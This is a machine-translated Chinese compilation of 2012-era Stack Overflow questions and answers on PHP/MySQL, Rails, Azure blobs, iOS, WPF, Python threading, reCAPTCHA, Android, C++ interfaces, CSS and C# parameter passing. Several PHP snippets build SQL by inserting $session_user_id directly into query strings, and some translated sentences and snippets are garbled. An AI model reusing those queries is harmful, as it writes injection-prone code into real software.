您应该尝试设置[`CreateNoWindow`](http://msdn.microsoft.com/en-us/library/system.diagnostics.processstartinfo.createnowindow.aspx)为`true`：

```
process.StartInfo.CreateNoWindow = true; 
```

# php - 获取用户的最新消息

> ID：11917415
> 
> 赞同：1
> 
> 时间：2012-08-11T20:30:29.760
> 
> 标签：php, mysql, phpmyadmin, message

我要做的是从用户发送给我的消息中选择最近的消息。

例如有两个用户：

*   理查德
*   保罗

*理查德*给我发了三个信息：

1.  你好
2.  你好吗？
3.  这是怎么回事？

*保罗*给我发了一条信息：

1.  你好

我如何向我显示*Richard 的* **RECENT**消息而不是所有三条消息，然后显示*Paul 的*一条消息（显然它们是按发送时间排序的）。

这就是我所拥有的...

```
$query = mysql_query("SELECT * FROM `private_messages` WHERE `to_id`='$session_user_id' AND `id`=(SELECT MAX(id) FROM `private_messages`) ORDER BY `time_sent` DESC") or die("Error."); 
```

这仅显示第一条消息，即 max `id`，我该如何解决？：（ 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:36:41.277

如果我理解正确，您只想显示每个人发送给您的最后一条消息...

为此，您可以使用派生表并将两者连接在一起。

```
SELECT *
FROM
    (
        SELECT MAX(id) AS message_id
        FROM private_messages
        WHERE to_id='$session_user_id'
        GROUP BY sender_id
    ) msg_ids
JOIN private_messages ON msg_ids.message_id = private_messages.id
ORDER BY time_sent DESC; 
```

我会试试这个查询。确保将 GROUP BY 子句中的字段名称“sender_id”更改为正确的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-11T20:34:25.253

`to_id`试试这个，它将选择等于的最新消息`$session_user_id`：

```
$query = "SELECT * FROM `private_messages` WHERE `to_id`='$session_user_id' ORDER BY `time_sent` DESC LIMIT 0, 1";
mysqli_query($query) or die("Error."); 
```

理想情况下，您应该添加一个列`from_id`，以便您可以仅过滤掉两个相关人员之间的消息：

```
$query = "SELECT * FROM `private_messages` WHERE (`to_id`='$session_user_id' AND `from_id`=[FROM_ID_GOES_HERE_]) ORDER BY `time_sent` DESC LIMIT 0, 1";
mysqli_query($query) or die("Error."); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T20:36:25.493

与其他答案一样，除了此之外，由于过滤来自用户，因此也只会获得三条消息中的两条。

```
$query = "SELECT * FROM `private_messages` WHERE `to_id`='$session_user_id' AND from_id='rich_uid' ORDER BY `time_sent` DESC LIMIT 0, 1";
mysqli_query($query) or die("Error."); 
```

## 编辑

要使用此查询，您需要了解 Rich 的用户 ID，即他的“ `$session_user_id`”，并将您选择的新字段（此处显示为`from_id`）放置到此表的架构中，并使用它来过滤 Rich 的 ID。

# ruby-on-rails - 无法在 ActiveAdmin 和 Mongoid 3.x 中保存自定义字段（数组）

> ID：11917418
> 
> 赞同：1
> 
> 时间：2012-08-11T20:30:59.810
> 
> 标签：ruby-on-rails, ruby-on-rails-3, mongoid, activeadmin, mongoid3

我有一个字段“位置”，它是一个数组 [lng, lat]。

我在ActiveAdmin表单中有两个输入字段，定义如下

```
f.inputs :name => "Location" do
  f.input :latitude
  f.input :longitude
end 
```

为了获得纬度和经度，我在模型中定义了两个吸气剂：

```
def latitude
  location[1]
end

def longitude
  location[0]
end 
```

表单按预期显示。

为了保存这些值，我在模型中创建了两个 setter

```
def latitude=(lat)
  self[:location][1] = lat.to_f
end

def longitude=(lon)
  self[:location][0] = lon.to_f
end 
```

在表单提交之后，这些方法被调用，但值不会被持久化。

我错过了什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T20:44:56.477

我找到了解决方案。当我使用 set() 时，它起作用了。保存和 update_attribute - 没有。

```
def latitude=(lat)
  self[:location][1] = lat.to_f
  self.set :location, self[:location]
end

def longitude=(lon)
  self[:location][0] = lon.to_f
  self.set :location, self[:location]
end 
```

# file-upload - 将二进制文件从 httppostedfile 保存到 blob

> ID：11917421
> 
> 赞同：9
> 
> 时间：2012-08-11T20:31:58.433
> 
> 标签：file-upload, azure, binary, blob

有人可以提供代码以二进制形式将上传的文件保存到 azure blob 吗？我目前使用文本保存，它在大文件上非常慢，逐行读取/保存到 blob。

```
Private Function ReadFile(ByVal file As HttpPostedFile) As String
        Dim result As String = ""
        Dim objReader As New System.IO.StreamReader(file.InputStream)
        Do While objReader.Peek() <> -1
            result = result & objReader.ReadLine() & vbNewLine
        Loop
        Return result
    End Function 
```

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-11T21:06:51.233

此代码片段基于将照片推送到 blob 存储的生产应用程序。这种方法直接从 HttpPostedFile 中提取流并将其直接传递给客户端库以存储到 blob 中。您应该根据您的应用程序改变一些事情：

*   blobName 可能需要适应。
*   直到获取 blob 客户端的连接字符串应该被隔离到辅助类中
*   同样，您可能需要基于您的业务逻辑的 blob 容器的帮助程序
*   您可能不希望容器完全可公开访问。这只是为了向您展示如何执行此操作，如果您愿意的话

```
// assuming HttpPostedFile is in a variable called postedFile  
var contentType = postedFile.ContentType;
var streamContents = postedFile.InputStream;
var blobName = postedFile.FileName

var connectionString = CloudConfigurationManager.GetSetting("YOURSTORAGEACCOUNT_CONNECTIONSTRING");
var storageAccount = CloudStorageAccount.Parse(connectionString);
var blobClient = storageAccount.CreateCloudBlobClient();

var container = blobClient.GetContainerReference("YOURCONTAINERNAME");
container.CreateIfNotExist();
container.SetPermissions(new BlobContainerPermissions { PublicAccess = BlobContainerPublicAccessType.Blob });

var blob = container.GetBlobReference(blobName);
blob.Properties.ContentType = contentType;
blob.UploadFromStream(streamContents); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-11-27T09:38:16.473

[6 年后， Dennis Burton 的](https://stackoverflow.com/users/168720/dennis-burton)答案似乎与 WindowsAzure.Storage v9.3.2 不兼容。

对我来说，这有效：

```
IFormFile postedFile = null;
var contentType = postedFile.ContentType;
var blobName = postedFile.FileName;

var connectionString = "YOURSTORAGEACCOUNT_CONNECTIONSTRING";
var storageAccount = CloudStorageAccount.Parse(connectionString);
var blobClient = storageAccount.CreateCloudBlobClient();

var container = blobClient.GetContainerReference("YOURCONTAINERNAME");
await container.CreateIfNotExistsAsync();

var blob = container.GetBlockBlobReference(blobName);
blob.Properties.ContentType = contentType;
using (var streamContents = postedFile.OpenReadStream())
{
    await blob.UploadFromStreamAsync(streamContents);
} 
```

# ios - iOS – 带有自定义单元格背景的普通 UITableView

> ID：11917425
> 
> 赞同：0
> 
> 时间：2012-08-11T20:32:25.920
> 
> 标签：ios, cocoa-touch, uitableview

我正在使用`UITableView`普通模式，因为我想要粘性部分标题。我有一个为单元格设置的自定义背景图像，`backgroundView`但该图像被拉伸到整个`UITableView`.

我怎样才能防止它被拉伸？我尝试设置`UIViewContentModeCenter`无济于事，但我真的不知道将其设置为哪个视图（表格视图，单元格？单元格的内容视图？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T23:06:12.557

背景视图总是适合整个单元格。所以你有一个容器视图 -

```
UIView *cntr = [UIView alloc] initWithFrame:<whole cell frame>]
[cntr addSubview:myCustomView]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T07:03:03.670

我实际上并没有尝试设置`UIViewContentModeCenter`。`backgroundView`因此设置使图像不会拉伸。

# javascript - 正确的方式（jshint.com 验证）使用'this' | 分配给 var

> ID：11917427
> 
> 赞同：0
> 
> 时间：2012-08-11T20:32:35.437
> 
> 标签：javascript

为什么将 this 分配给 var 会破坏 jshint.com

我知道如何在 jshint.com 中绕过它。

另外，我知道如何摆脱它。

但我想知道这打破了严格的定义。

**示例代码**

```
function vFlipBP( element_or_string ) {
    var previous_page_element,
        previous_tag_element,
        current_page_element,
        select_element;
    if( typeof ( element_or_string ) === 'string' ) {
        select_element = document.getElementById( element_or_string );
    } else {
        select_element = this; // Possible strict violation <- error here
    }
.
.
. 
```

**呼叫类型 1**

```
document.getElementById( this.tag_array[element] ).onclick = vFlipBP; 
```

**呼叫类型 2**

```
vFlipBP( this.tag_array[0] ); // string parameter 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:36:02.580

它在未绑定到值时中断`this`，这可能是 JSHint 的情况，因为它是您所在的函数声明，而不是函数文字。如果您总是给出`this`一个值（使用`call`or `apply`，或通过将函数分配给属性），那么您可以放心地忽略它。

# excel - Excel 2010 VBA 代码将屏幕复制到剪贴板

> ID：11917428
> 
> 赞同：0
> 
> 时间：2012-08-11T20:32:42.867
> 
> 标签：excel, vba

我正在寻找 Excel 2010 中的 VBA 代码，它可以让我在 Excel 中截取特定范围的屏幕截图。

现在，当我在 excel 中选择一个范围，然后复制时，视图与实际的屏幕视图失真。

如果您有任何问题，请告诉我 - 谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:37:42.130

[http://support.microsoft.com/kb/240653](http://support.microsoft.com/kb/240653)

这个链接非常适合我需要的东西。

64位的完整代码如下：

```
Private Declare PtrSafe Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal _
bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

Private Declare PtrSafe Function GetVersionExA Lib "kernel32" _
(lpVersionInformation As OSVERSIONINFO) As Integer

Private Type OSVERSIONINFO
dwOSVersionInfoSize As Long
dwMajorVersion As Long
dwMinorVersion As Long
dwBuildNumber As Long
dwPlatformId As Long
szCSDVersion As String * 128
End Type

Private Const KEYEVENTF_KEYUP = &H2
Private Const VK_SNAPSHOT = &H2C
Private Const VK_MENU = &H12

Dim blnAboveVer4 As Boolean

Sub takeScreenShot()

   If blnAboveVer4 Then
     keybd_event VK_SNAPSHOT, 0, 0, 0
   Else
     keybd_event VK_SNAPSHOT, 1, 0, 0
   End If
End Sub 
```

# ios - 如何在情节提要的非启动 ViewController 上为按钮的 TouchUpInside 事件添加自定义代码？

> ID：11917432
> 
> 赞同：0
> 
> 时间：2012-08-11T20:34:04.473
> 
> 标签：ios, xcode, interface-builder

我在 XCode 4.3.3 中创建了故事板应用程序。（单视图应用程序 -> 使用情节提要复选框）

然后我创建了第二个 ViewController（第一个是在最初创建应用程序时创建的）

我将标题为“log2”的圆形矩形按钮添加到第二个 ViewController。

然后我想添加处理事件“TouchUpInside”的代码。为了实现这一点，我按下“显示助理编辑器”按钮并尝试控制将“log2”按钮拖动到 ViewController.h 的源代码。
但没有任何反应。

如何为上述“log2”按钮添加 TouchUpInside 处理程序？

有趣的是，如果我将按钮添加到第一个 ViewController，控件拖动对按钮工作正常，我可以创建事件处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:04:20.803

是的，您想手动添加一个文件，这是 UIViewController 的子类到您的项目，并将情节提要中的第二个视图控制器设置为该类（在身份检查器中）。然后你应该将按钮连接到那个控制器，而不是第一个。

# android - android OS 源代码是否有任何交叉参考站点？

> ID：11917433
> 
> 赞同：-1
> 
> 时间：2012-08-11T20:34:11.753
> 
> 标签：android, operating-system, lxr

android操作系统的开源代码是否有任何等效的交叉引用，例如linux（[lxr](http://lxr.free-electrons.com/)）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-16T18:32:27.280

感谢 [code4reference.com](http://code4reference.com)

*   [Android googlesource.com](http://source.android.com/source/downloading.html)
*   [安卓的外部参照](http://androidxref.com/4.1.1/xref/)
*   [github 仓库](https://github.com/android)

# iphone - 新手难以理解选择器

> ID：11917434
> 
> 赞同：2
> 
> 时间：2012-08-11T20:34:16.720
> 
> 标签：iphone, objective-c, xcode

我在一个 xib 文件中设置了我的用户界面，并且一切都运行良好。但是 xib 文件非常混乱，所以我决定尝试创建一些按钮/栏/等。而是以编程方式。我可以让它们正常显示，但我在选择器上做错了。

例如，使用 xib 文件上的`instructions`按钮，我只是使用鼠标将`instructions`按钮与`giveInstructions`.h 文件中的方法连接起来，一切都很好。但是当我以编程方式尝试时，就像这样：

```
UIBarButtonItem *instr = [[UIBarButtonItem alloc] initWithTitle:@"Instructions" 
                                                          style:UIBarButtonSystemItemDone target:nil action:@selector(giveInstructions:)]; 
```

我得到一个`unrecognized selector sent to instance`错误。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:37:20.773

你`target`不应该是`nil`应该接收动作的实例。这可能`self`是你的情况，所以试试这个：

```
UIBarButtonItem *instr = [[UIBarButtonItem alloc] initWithTitle:@"Instructions" style:UIBarButtonSystemItemDone target:self action:@selector(giveInstructions:)]; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:45:31.103

看到您解决了目标问题，“giveInstructions”很可能不存在，至少在此类的实现中不存在。

如果您已声明

```
- (void)giveInstructions:(id)sender; 
```

在您的 .h 中，您的 .m 文件中必须有一个匹配的实现，例如：

```
- (void)giveInstructions:(id)sender{
    //my code here
} 
```

如果您已经这样做了，那么我能想到的唯一另一件事可能是错误的，`@selector(giveInstructions:)`如果您没有发件人或从该方法传递的任何其他参数，则冒号中的冒号可能是不必要的。

**注意：**调用`@selector`时，如果您调用的方法与其实际声明的名称相差 1 个字符，您将收到此错误，因为选择器不存在。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-11T20:52:17.683

选择器的命名很重要。

如果它有一个冒号，那么它指的是一个接受一个参数的方法

```
@selector(myMethod:)

- (void)myMethod:(id)sender; 
```

如果它没有冒号，则该方法不需要参数

```
@selector(myMethod)

- (void)myMethod; 
```

**注意**虽然它们看起来都具有相同的名称，但实际上它们是两种不同的方法。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-11T20:41:24.497

```
UIBarButtonItem *instr = 
[[UIBarButtonItem alloc] initWithTitle:@"Instructions" 
style:UIBarButtonSystemItemDone target:self action:@selector(giveInstructions:)];
<-- change "nil" to "self" ! 
```

我认为目标：`nil`应该是`self`因为那些函数属于这个类文件。

# c# - 通过绑定更新 wpf ListBox 项的不透明度

> ID：11917439
> 
> 赞同：0
> 
> 时间：2012-08-11T20:35:16.507
> 
> 标签：c#, .net, wpf, data-binding

我有一个看起来像这样的列表框：

```
<ListBox  
     ItemsSource="{Binding LoadingModules}">
     <ListBox.ItemTemplate>
       <DataTemplate>
          <TextBlock Opacity="{Binding ModuleLoaded, Mode=TwoWay, 
                               Converter={StaticResource BoolToDoubleConverter}}"
                     Text="{Binding ModuleName}" />
       </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

这个想法是任何具有 ModuleLoaded = true 的项目都应该有 20% 的不透明度。

这在设计时效果很好。但是在运行时这不会发生。

这是我实际更改值的逻辑：

```
private void OnModuleLoaded(ModuleInfo moduleInfo)
{
    LoadingModules.Where(x => x.ModuleName == moduleInfo.ModuleName)
                  .FirstOrDefault().ModuleLoaded = true;
} 
```

我的任何 LoadingModule 类的 ModuleLoaded 定义如下：

```
private bool moduleLoaded;
public bool ModuleLoaded 
{
    get { return moduleLoaded ; }
    set
    {
        if (!object.Equals(moduleLoaded , value))
        {
            moduleLoaded  = value;
            OnPropertyChanged("ModuleLoaded ");
        }
    }
} 
```

我能够让它工作的唯一方法是这样做：

```
var foundModule = LoadingModules.Where(x => x.ModuleName==moduleInfo.ModuleName)
                                .FirstOrDefault();
LoadingModules.Remove(foundModule);
foundModule.ModuleLoaded = false;
LoadingModules.Add(foundModule); 
```

这确实有效，所以我知道我的绑定和转换器已连接。

但是删除和重新添加并不是真正的解决方案。它会导致问题，因为我的事件没有按完美的顺序到达。

**有什么方法可以让我的 ListBox.ItemTemplate DataTemplate 基于绑定动态更新？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:40:24.770

您正在传递`"ModuleLoaded "`而不是传递`"ModuleLoaded"`给您的`OnPropertyChanged`呼叫。这意味着即使您的属性值发生更改，UI 也不会得到通知，因此会保留其原始状态。

除此之外，您的`Where`电话是多余的。而不是打电话

```
LoadingModules.Where(x => x.ModuleName == moduleInfo.ModuleName)
              .FirstOrDefault(); 
```

你可以简单地打电话

```
LoadingModules.FirstOrDefault(x => x.ModuleName == moduleInfo.ModuleName); 
```

# python - 如何在 Python 中调用线程派生类方法？

> ID：11917443
> 
> 赞同：3
> 
> 时间：2012-08-11T20:35:46.500
> 
> 标签：python, multithreading, inheritance

目前我不是python程序员，但我正在对一些python代码进行一些维护，我或多或少有以下内容：

```
class DerivedThread(threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)

  def initStuff():
    print "Hello 2"

  def run(self):
    print "Hello 1"
    self.initStuff()
    print "Hello 3" 
```

`initStuff`其实不调用`print`，只是设置了一些变量，我添加了这个方法来组织，只有`__init__`和`run`之前。

问题是，一旦执行完成`self.initStuff()`，我就看不到任何消息了，只是`"Hello 1"`，我认为用 python 调用派生方法有问题，但我不知道发生了什么。

发生了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T21:08:21.093

问题在于您的`initStuff`方法的定义。它的定义中至少需要一个参数（通常称为“自我”）（您没有定义任何参数）。让我们看看接下来会发生什么：

```
class MyClass(object):

    def initStuff(self):
        pass

c = MyClass()
c.initStuff()

TypeError: initStuff() takes no arguments (1 given) 
```

因此，显然您的代码在您定义的线程中静默失败。

解决问题的方法是`initStuff`按照 Python 规则定义方法。

```
 ...
 def initStuff(self):  #  Here 'self' argument is defined
      pass 
```

这种方法称为**instancemethod**，因为它代表您的类实例调用（第一个参数是必须显式定义的实例对象本身）。

[在文档](http://docs.python.org/tutorial/classes.html#classes)中阅读更多关于类的信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:39:05.983

哦，我明白了，我只需要`self`作为参数传递给`initStuff`.

# php - Recaptcha 在实时站点上始终无效

> ID：11917444
> 
> 赞同：0
> 
> 时间：2012-08-11T20:35:51.880
> 
> 标签：php, captcha, recaptcha

[recaptcha](http://www.google.com/recaptcha)似乎在我的本地计算机上验证，但是当我将它上传到我的实时站点时它总是失败。我转储了答案/响应对象，它看起来像这样：

```
ReCaptchaResponse::__set_state(array(
   'is_valid' => false,
   'error' => '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"',
)) 
```

里面有HTML！这是怎么回事，为什么会失败？

我`$_POST`也丢弃了我的变量，它们看起来像这样：

```
array (
  *snip*
  'recaptcha_challenge_field' => '03AHJ_VuvqpAkJnmfOZHHf80EPt85lVEeq9IRuO9zw1jZ1fzUk-_DAw0z2k3-TeXzAXQVXUWChyCGnC1RoXRPly4Ldz0FugPKW_WKWEoKysNLnpcv2xvyWONpq0VDV3ipsy5Vukui0zxlSqiBBWw00VYPSkO52OqMv_A',
  'recaptcha_response_field' => 'uterf sw',
) 
```

* * *

验证码：

```
$recaptcha_answer = recaptcha_check_answer('MY_PRIVATE_KEY_HERE', $_SERVER['REMOTE_ADDR'], $_POST['recaptcha_challenge_field'],  $_POST['recaptcha_response_field']);

if(!$recaptcha_answer->is_valid) {
    $validation_errors[] = 'The reCAPTCHA you entered was not correct';
    echo '<!-- '.var_export($recaptcha_answer,true).var_export($_POST,true).' -->';
} 
```

显示代码：

```
<?= recaptcha_get_html('MY_PUBLIC_KEY_HERE') ?> 
```

* * *

如果我将 recaptcha 文本框留空并提交表单，我会收到正确的错误消息：

> 不正确的验证码溶胶

但是如果我填写它，它总是显示那个文档类型......我只是注意到那不是我正在使用的文档类型；它是否试图告诉我我需要使用严格的文档类型而不是过渡？

* * *

如果有任何区别，我将使用“干净”主题：

```
<script type="text/javascript">
    var RecaptchaOptions = {
        theme : 'clean'
    };
</script> 
```

“红色”显示不正确；文本框未对齐。

* * *

做了一些戳到图书馆。有一种方法叫`_recaptcha_http_post`. 它用于`fsockopen`向验证服务器发送请求。传出请求如下所示：

```
POST /recaptcha/api/verify HTTP/1.0
Host: www.google.com
Content-Type: application/x-www-form-urlencoded;
Content-Length: 272
User-Agent: reCAPTCHA/PHP

privatekey=<<MY INFO HERE>>&amp;challenge=<<BLAH>>... 
```

但我得到的回复看起来不像来自谷歌。这是“禁止访问！” 页。我想知道是不是有什么东西在拦截它...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T22:14:37.963

我发现了这个问题。由于谷歌没有返回响应，我尝试查找 IP：

```
echo 'www.google.com: '. gethostbyname('www.google.com').'<br/>';
echo '<offending site>: '. gethostbyname('<offending site>'); 
```

当我在我的服务器上运行它时它们是一样的！有人搞砸了主机查找。啊!

# android - 强制自定义 ViewGroup 子项类型和计数

> ID：11917445
> 
> 赞同：2
> 
> 时间：2012-08-11T20:35:58.187
> 
> 标签：android, android-layout, viewgroup

我正在通过扩展抽象类 ViewGroup 来制作自定义布局 Android 组件（根据 Parleys.com 上 Romain Guy 的此视频教程：http: [//www.parleys.com/#st=5&id=2191&sl=1](http://www.parleys.com/#st=5&id=2191&sl=1)）。

我的组件应该包含子组件，但我想将其限制为只有 1 个 ViewGroup 类型的子组件（例如另一个 LinearLayout 或 RelativeLayout）。有点像 ScrollView。有没有办法添加这个限制？

编辑：正如 android 开发人员所说，最终解决方案是以编程方式检查 ViewGroup 子类的 onFinishInflate 约束，如下所示：

```
@Override
public void onFinishInflate()
{
    if (getChildCount() > 1)
        throw new IllegalArgumentException("Only 1 child allowed");

    if (getChildCount() == 0 || !(getChildAt(0) instanceof ViewGroup))
        throw new IllegalArgumentException("Child must be a ViewGroup");
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T20:43:13.223

你当然可以 。

只需通过 using 获取孩子数，[`getChildCount()`](http://developer.android.com/reference/android/view/ViewGroup.html#getChildCount%28%29)以检查是否只有一个孩子。

然后，通过使用获取 viewGroup 中唯一的孩子[`getChildAt(0)`](http://developer.android.com/reference/android/view/ViewGroup.html#getChildAt%28int%29)。

在此之后，对结果使用反射并对它的类做任何额外的检查（例如，使用[`getSuperclass()`](http://docs.oracle.com/javase/1.3/docs/api/java/lang/Class.html#getSuperclass%28%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-05-08T04:06:18.183

让我从自定义视图组开始为其他所有人添加这个问题的答案。

当视图被添加到任何类型的视图组时，可以使用的方法如下：

```
public void addView(View child)
public void addView(View child, int index)
public void addView(View child, int width, int height)
public void addView(View child, LayoutParams params)
public void addView(View child, int index, LayoutParams params) 
```

无论是通过 xml 还是代码添加 ViewGroup 及其子项，都将调用其中一种方法。

现在，如果您想将自定义视图组限制为特定条件。只需在这些方法中添加该条件。

这是取自 ScrollView 类的示例代码。

```
@Override
public void addView(View child) {
    if (getChildCount() > 0) {
        throw new IllegalStateException("ScrollView can host only one direct child");
    }

    super.addView(child);
}

@Override
public void addView(View child, int index) {
    if (getChildCount() > 0) {
        throw new IllegalStateException("ScrollView can host only one direct child");
    }

    super.addView(child, index);
}

@Override
public void addView(View child, ViewGroup.LayoutParams params) {
    if (getChildCount() > 0) {
        throw new IllegalStateException("ScrollView can host only one direct child");
    }

    super.addView(child, params);
}

@Override
public void addView(View child, int index, ViewGroup.LayoutParams params) {
    if (getChildCount() > 0) {
        throw new IllegalStateException("ScrollView can host only one direct child");
    }

    super.addView(child, index, params);
} 
```

提示：在寻找特定实现时，您可以去寻找 android 组件如何实现事物并将其作为指南来实现。:)

# c++ - 接口，绝对是纯虚函数，或者......？

> ID：11917454
> 
> 赞同：4
> 
> 时间：2012-08-11T20:37:42.350
> 
> 标签：c++, inheritance, interface, terminology

每次我读到接口时，都会提到它没有任何数据成员或实现。

但是当我看到带有接口的代码时，它们两者都有。

```
class IInterface
{
public:
    IInterface(){}
    virtual ~IInterface(){}
    int getInt(){ return m_int; }
    virtual void Boo() = 0;
    int m_int;
};

class cInterface : public IInterface
{
public:
    virtual void    Boo()
                    {
                        printf( "defined in .cpp for readability\n" );
                    };
};

class cFoo : public cInterface
{
}; 
```

（几乎）我从来没有在源文件中看到它们，而只有标题。

这个术语的使用有多严格，如果上面不是接口，它是如何调用的？

将其用作 IInterface* 时是否反映了 cInterface/cFoo 的用法？

```
...
cFoo foo;
IInterface* object = &foo;
object->Boo();
... 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T21:17:15.743

C++ 在其语言定义中没有接口类型的正式定义，也没有办法强制编写纯抽象类。然而，这个概念肯定存在于软件工程中，并且可以追溯到很长很长的路要走。Corba 和 COM 是典型的例子。通用技术称为“基于接口的编程”。另一个流行的标签是“按合同设计”。一些 C++ 编译器具有支持它们的语言扩展，例如 MSVC 中的 __interface。它在其他方面仍然是一个普通的类，编译器只是强制执行纯度。

一个具体的例子是使用一个接口来定义一个实际存在于另一个运行时环境中的对象的代理。就像在地球另一端的机器上一样。代理，接口的本地实现，具有在线路上发送参数值的方法。电线的另一端有一个带有实际方法的存根。如果对象实际上是在本地创建的，则客户端代码不需要任何更改，其主要优点是它仍然使用相同的接口。换句话说，实现是不可见的，不会影响代码。您给出的示例在这种情况下将*无法*正确运行，远程对象将没有正确的 m_int 成员值。它不是接口，只是一个抽象类。

接口在不实现多重继承的语言中尤其重要。由于钻石问题，MI 很困难。但这是一个*实现*继承问题，继承多个接口没有问题。这种语言必须解决的唯一小问题是当两个或多个继承接口具有具有相同名称和签名的方法时的歧义。但这可以通过为语言提供一种方法来指定正在实现的特定接口方法来轻松解决。就像 C# 中的“显式接口实现”语法一样。不确定Java是做什么的。

另一个既实用又麻烦的方面是它是设计工具，即“契约式设计”的角度。如果您与很多开发人员一起从事一个大型项目，那么您最终往往会得到很多接口。它们包含了建筑师发出的“这是我们*应该做的”。*但是没有任何“这就是我所做的”，尤其是在项目的早期。真正的错误是实现错误，很少是接口错误。一个真正让多个程序员同时工作的优秀工具。但是主要糟糕的是要让项目的基础健全并锁定，这样你就可以在上面进行构建。不是 Bjarne 的工作方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:43:26.843

C++ 中对这个术语没有严格的定义。它通常*松散地*用来表示一个主要是抽象的类：一个定义交互协议而不是任何类型的实现的类。由于它不是语言中构建的概念，因此人们可以对定义不那么严格，并且数据有时会潜入“接口”。

然而，在某些编程语言和系统中——Java 是一个典型的例子——它是一种语言特性，并且具有非常正式的含义。在这些环境中，确切的含义当然是特定于环境的，但通常与上面讨论的大致相同。在 Java 中，*接口*是一种只有纯虚函数和编译时常量数据成员的类。Java 允许一个类只*扩展*另一个类，但一个类可以*实现*任意数量的接口。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T22:08:01.717

简单地说，“接口”可以用来指代方法和/或数据——具体的或抽象的（例如`virtual`）。“接口”的更基本定义也经常用于指代您的实现可以访问的内容（例如，公共方法是公共接口的一部分）。

正如 Ernest 所指出的，您似乎在某些时候所期望的定义是 Java 的定义，而 Java 的定义则大不相同，因为它意味着非常具体的东西。Java 的接口表示/定义类似于 C++ 中的纯抽象类。

因此，“接口”不等同于 C++ 中的纯抽象类——它是一个更通用的术语，可用于指代对象*声明*的方法（虚拟或非虚拟）和基类（但不包括这些方法的定义）。我说，即使声明的 typedef 和常量也可以作为对象接口的一部分（特别是在模板元编程中）；尽管我怀疑某些人的定义可能太过分了（实际上，接口在 C++ 中并没有严格定义——所以一个人的定义可能会因他们经常光顾的水坑而异）。

# html - 封面背景图片缩放不正确？

> ID：11917455
> 
> 赞同：0
> 
> 时间：2012-08-11T20:37:43.440
> 
> 标签：html, css, background, webkit

我试图弄清楚为什么我的 webkit 封面背景在我网站的某些页面上没有正确缩放。

URL 是[http://www.finestgc.com/](http://www.finestgc.com/)。在首页，你可以看到封面背景图片缩放正常，问题出在其他页面，例如：[http](http://www.finestgc.com/general.html) ://www.finestgc.com/general.html在那里你可以看到图片也完全缩放大的。

CSS/HTML 专家可以帮我确定发生这种情况的原因吗？任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T21:46:38.787

在您的 CSS 文件中，更改以下内容：

```
body
{
    background: url('images/blueprint.png') #222 no-repeat;
    ....
} 
```

到：

```
body
{
    background: url('images/blueprint.png') #222 no-repeat fixed;
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T22:53:05.717

在您的第二页[http://www.finestgc.com/general.html](http://www.finestgc.com/general.html)

在**CSS** on body 添加此代码

> 背景附件：固定；

# c# - 为什么选择 IEnumerable 在这里返回null？

> ID：11917456
> 
> 赞同：0
> 
> 时间：2012-08-11T20:37:48.633
> 
> 标签：c#

谁能告诉我为什么方法参数 IEnumerable 会返回 null，即使它是在被调用方方法中分配的。我们都知道接口是一个引用类型。

不要考虑逻辑。我只是替换了我的业务逻辑以适应场景

```
static void Main()  
{   
  IEnumerable<int> gEnumerable = null;  
  Foo(gEnumerable);    //here param gEnumerable always returns null even if i assign  value at my Foo(), why is it so???  
}    

static IEnumerable<int> Bar(List<int> lst)         
{  
  return lst.Select(k => k);  
}  

private  static  void Foo(IEnumerable<int> response)  
{  
  response = Bar(new List<int> { 1, 2, 3, 4, 5, 6 });  
} 
```

请向我解释一下

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-11T20:40:19.373

> 我们都知道接口是一个引用类型。

您需要研究一下如何在 C# 中传递参数。 *一切*都是按值传递的（默认情况下）。在引用类型的情况下，引用在传递给函数时被*复制（因为引用是它的值）。**因此，您正在为引用的副本*分配一个新值，而调用者看不到它。

如果您确实需要为引用分配一个全新的值，那么您必须使用`ref`or`out`说明符。如果您的方法保证它将为其输入分配一个新值，则使用`out`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-11T20:40:02.657

您必须`response`通过引用传递，否则您不会更改传递的原始引用 - 如果可以避免，您应该避免这种方法：

```
static void Main()  
{   
  IEnumerable<int> gEnumerable = null;  
  Foo(ref gEnumerable);    
} 
private  static void Foo(ref IEnumerable<int> response)  
{  
   response = Bar(new List<int> { 1, 2, 3, 4, 5, 6 });  
} 
```

